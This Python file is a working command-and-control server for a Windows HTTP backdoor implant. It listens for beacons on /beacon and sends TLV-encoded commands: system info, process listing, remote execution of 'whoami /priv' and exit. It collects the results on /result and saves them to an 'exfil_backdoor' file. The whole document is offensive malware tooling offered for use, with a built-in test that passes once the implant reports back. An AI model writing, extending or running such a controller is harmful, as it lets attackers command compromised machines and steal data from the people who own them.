#!/usr/bin/env python3
"""HTTP-based backdoor C2 server for winhttp_beacon.c protocol.

The payload sends TLV frames over HTTP POST:
- POST /beacon: heartbeat TLV (cmd=0x01, payload=tick), server responds with command TLV
- POST /result: result TLV (cmd=actual, payload=data)

Usage:
  python3 c2_backdoor_http.py --test-sequence 9001
  python3 c2_backdoor_http.py --interactive 9001
"""
import http.server
import struct
import sys
import time
import threading
import os

CMD_HEARTBEAT = 0x01
CMD_SYSINFO = 0x02
CMD_PROCESSES = 0x03
CMD_EXEC = 0x0A
CMD_EXIT = 0x0D
CMD_NOOP = 0xFF

CMD_NAMES = {0x01: "HEARTBEAT", 0x02: "SYSINFO", 0x03: "PROCESSES",
             0x04: "FILELIST", 0x05: "FILEREAD", 0x09: "NETINFO",
             0x0A: "EXEC", 0x0D: "EXIT", 0xFF: "NOOP"}

pending_cmd = None
results = []
beacon_count = 0
lock = threading.Lock()
output_file = None
test_mode = False
test_commands = []
test_idx = 0

def make_tlv(cmd_id, payload=b""):
    return struct.pack("<II", cmd_id, len(payload)) + payload

class C2Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_POST(self):
        global beacon_count, pending_cmd, test_idx
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length > 0 else b""

        if self.path == "/beacon":
            beacon_count += 1
            if len(body) >= 8:
                cmd_id, plen = struct.unpack("<II", body[:8])
                print(f"  [BEACON #{beacon_count}] cmd=0x{cmd_id:02x} payload={plen}B")

            with lock:
                if pending_cmd is not None:
                    resp = pending_cmd
                    pending_cmd = None
                elif test_mode and test_idx < len(test_commands):
                    cmd, arg = test_commands[test_idx]
                    test_idx += 1
                    resp = make_tlv(cmd, arg.encode() if isinstance(arg, str) else arg)
                    print(f"  >> Sending command: {CMD_NAMES.get(cmd, hex(cmd))} arg={arg!r}")
                else:
                    resp = make_tlv(CMD_NOOP)

            self.send_response(200)
            self.send_header("Content-Length", str(len(resp)))
            self.end_headers()
            self.wfile.write(resp)

        elif self.path == "/result":
            if len(body) >= 8:
                cmd_id, plen = struct.unpack("<II", body[:8])
                payload = body[8:8+plen] if plen > 0 else b""
                name = CMD_NAMES.get(cmd_id, f"0x{cmd_id:02x}")
                text = payload.decode("utf-8", errors="replace")
                results.append((cmd_id, text))
                print(f"  [RESULT] {name}: {len(payload)}B")
                if len(text) < 2000:
                    for line in text.split("\n")[:20]:
                        if line.strip():
                            print(f"    {line.rstrip()}")

                if output_file:
                    with open(output_file, "ab") as f:
                        f.write(f"=== {name} ===\n".encode())
                        f.write(payload)
                        f.write(b"\n")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
        else:
            self.send_response(404)
            self.end_headers()

def run_test_sequence(port):
    global test_mode, test_commands, output_file
    test_mode = True
    test_commands = [
        (CMD_SYSINFO, ""),
        (CMD_PROCESSES, ""),
        (CMD_EXEC, "whoami /priv"),
        (CMD_EXIT, ""),
    ]
    output_file = f"exfil_backdoor_{int(time.time())}.bin"

    print(f"[C2] HTTP backdoor controller on :{port}")
    print(f"[C2] Test sequence: {len(test_commands)} commands")
    print(f"[C2] Output: {output_file}")
    print(f"[C2] Waiting for beacon...")

    srv = http.server.HTTPServer(("0.0.0.0", port), C2Handler)
    srv.timeout = 5

    deadline = time.time() + 120
    while time.time() < deadline:
        srv.handle_request()
        if test_idx >= len(test_commands) and len(results) >= 3:
            srv.handle_request()
            break

    srv.server_close()

    print(f"\n{'='*50}")
    print(f"Beacons received: {beacon_count}")
    print(f"Results received: {len(results)}")
    if output_file and os.path.exists(output_file):
        print(f"Output file: {output_file} ({os.path.getsize(output_file)} bytes)")

    has_sysinfo = any(r[0] == CMD_SYSINFO for r in results)
    has_procs = any(r[0] == CMD_PROCESSES for r in results)
    has_exec = any(r[0] == CMD_EXEC for r in results)

    if beacon_count > 0 and has_sysinfo and has_procs:
        print("VERDICT: PASS")
        return 0
    else:
        print(f"VERDICT: FAIL (beacons={beacon_count}, sysinfo={has_sysinfo}, procs={has_procs}, exec={has_exec})")
        return 1

if __name__ == "__main__":
    port = 9001
    mode = "--test-sequence"
    for arg in sys.argv[1:]:
        if arg.startswith("--"):
            mode = arg
        elif arg.isdigit():
            port = int(arg)

    if mode == "--test-sequence":
        sys.exit(run_test_sequence(port))
    else:
        print(f"Usage: {sys.argv[0]} [--test-sequence|--interactive] [port]")
